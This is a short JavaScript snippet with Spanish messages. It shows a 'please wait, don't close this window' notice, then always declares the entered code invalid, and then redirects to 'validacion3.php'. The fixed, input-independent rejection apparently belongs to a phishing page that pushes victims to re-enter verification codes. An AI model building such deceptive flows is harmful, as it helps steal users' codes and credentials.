const mees = document.getElementById('ab');
	function t1() {
  	const me = document.createElement('p');
  	me.textContent = 'Por favor esperá, no cerres esta ventana...';
  	mees.appendChild(me);
	}

	function t3() {
  	const me = document.createElement('p');
 	 me.textContent = 'Codigo invalido.';
 	 mees.appendChild(me);
	}
	setTimeout(t1, 2000);
	
	setTimeout(t3, 8000);
	setTimeout(function() {
	window.location.href = "validacion3.php";
	}, 10000);